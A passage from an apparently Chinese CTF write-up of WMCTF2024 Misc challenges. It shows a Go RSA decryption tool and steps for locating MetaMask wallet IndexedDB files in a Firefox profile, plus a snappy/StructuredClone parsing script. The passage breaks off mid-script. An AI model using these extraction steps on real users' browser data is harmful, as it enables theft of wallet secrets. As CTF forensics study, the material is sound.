class="line"><span class="string">&quot;crypto/x509&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/pem&quot;</span></span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// Function to load RSA keys from files</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadRSAKeys</span><span class="params">()</span></span> (*rsa.PrivateKey, <span class="type">error</span>) &#123;</span><br><span class="line">privateKeyPEM, err := ioutil.ReadFile(<span class="string">&quot;private_key.pem&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">block, _ := pem.Decode(privateKeyPEM)</span><br><span class="line"><span class="keyword">if</span> block == <span class="literal">nil</span> || block.Type != <span class="string">&quot;RSA PRIVATE KEY&quot;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to decode PEM block containing private key&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> privateKey, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Function to decrypt data using RSA and device key</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decrypt</span><span class="params">(encryptedData []<span class="type">byte</span>, privateKey *rsa.PrivateKey, deviceKey []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">hash := sha256.New()</span><br><span class="line">decryptedData, err := rsa.DecryptOAEP(hash, rand.Reader, privateKey, encryptedData, deviceKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> decryptedData, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printHelp</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Usage:&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;  -help                Show this help message&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;  -decrypt &lt;file&gt;      Decrypt the specified file (requires device key)&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;  -key &lt;key&gt;           Device key for decryption&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">help := flag.Bool(<span class="string">&quot;help&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;Show help message&quot;</span>)</span><br><span class="line">decryptFile := flag.String(<span class="string">&quot;decrypt&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;File to decrypt&quot;</span>)</span><br><span class="line">key := flag.String(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Device key for decryption&quot;</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"><span class="keyword">if</span> *help &#123;</span><br><span class="line">printHelp()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> *decryptFile == <span class="string">&quot;&quot;</span> || *key == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">printHelp()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(<span class="string">&quot;private_key.pem&quot;</span>); os.IsNotExist(err) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;no private key find!&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">privateKey, err := loadRSAKeys()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error loading RSA keys:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> *decryptFile != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">data, err := ioutil.ReadFile(*decryptFile)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error reading file:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">deviceKey, err := hex.DecodeString(*key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error decoding device key:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">decryptedData, err := decrypt(data, privateKey, deviceKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error decrypting data:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = ioutil.WriteFile(<span class="string">&quot;decrypted_&quot;</span>+*decryptFile, decryptedData, <span class="number">0644</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error writing decrypted file:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;File decrypted successfully!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将前面得到的rsa私钥保存为private_key.pem，然后计算一下前面得到的device_key的sha256用来解密</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924153146026.png"alt="image-20240924153146026" /><figcaption aria-hidden="true">image-20240924153146026</figcaption></figure><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924153209378.png"alt="image-20240924153209378" /><figcaption aria-hidden="true">image-20240924153209378</figcaption></figure><h3 id="metasecret">metasecret</h3><blockquote><p>当时这题甚至没有思路。。。</p></blockquote><p>在documents中有个password.txt</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924155025770.png"alt="image-20240924155025770" /><figcaption aria-hidden="true">image-20240924155025770</figcaption></figure><p>题目中的meta指的是metamask插件，我们可以在firefox下找到这个插件，然后去寻找它的idb文件，这里在~/AppData/Roaming/Mozilla/Firefox/Profiles/jawk8d8g.default-release/storage/default/moz-extension+++654e5b4f-4a65-4e1a-9b58-51733b6a2883^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.files/492这个路径下，将其导出</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924160140830.png"alt="image-20240924160140830" /><figcaption aria-hidden="true">image-20240924160140830</figcaption></figure><p>接下来预期解是对idb文件进行snappy解压，用如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> snappy</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;A SpiderMonkey StructuredClone object reader for Python.&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># This Source Code Form is subject to the terms of the Mozilla Public</span></span><br><span class="line"><span class="comment"># License, v. 2.0. If a copy of the MPL was not distributed with this</span></span><br><span class="line"><span class="comment"># file, You can obtain one at http://mozilla.org/MPL/2.0/.</span></span><br><span class="line"><span class="comment"># Credits:</span></span><br><span class="line"><span class="comment">#   – Source was havily inspired by</span></span><br><span class="line"><span class="comment">#     https://dxr.mozilla.org/mozilla-central/rev/3bc0d683a41cb63c83cb115d1b6a85d50013d59e/js/src/vm/StructuredClone.cpp</span></span><br><span class="line"><span class="comment">#     and many helpful comments were copied as-is.</span></span><br><span class="line"><span class="comment">#   – Python source code by Alexander Schlarb, 2020.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> enum</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> typing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ParseError</span>(<span class="title class_ inherited__">ValueError</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvalidHeaderError</span>(<span class="title class_ inherited__">ParseError</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSInt32</span>(<span class="title class_ inherited__">int</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent the standard 32-bit signed integer&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *a</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> (-<span class="number">0x80000000</span> &lt;= self &lt;= <span class="number">0x7FFFFFFF</span>):</span><br><span class="line"><span class="keyword">raise</span> TypeError(<span class="string">&quot;JavaScript integers are signed 32-bit values&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSBigInt</span>(<span class="title class_ inherited__">int</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent the arbitrary precision JavaScript “BigInt” type&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSBigIntObj</span>(<span class="title class_ inherited__">JSBigInt</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent the JavaScript BigInt object type (vs the primitive type)&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSBooleanObj</span>(<span class="title class_ inherited__">int</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent JavaScript boolean “objects” (vs the primitive type)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Note: This derives from `int`, since one cannot directly derive from `bool`.&quot;&quot;&quot;</span></span><br><span class="line">__slots__ = ()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">self, inner: <span class="built_in">object</span> = <span class="literal">False</span></span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>.__new__(<span class="built_in">bool</span>(inner))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__and__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bool</span>(self) &amp; other</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__or__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bool</span>(self) | other</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__xor__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bool</span>(self) ^ other</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__rand__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> other &amp; <span class="built_in">bool</span>(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__ror__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> other | <span class="built_in">bool</span>(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__rxor__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> other ^ <span 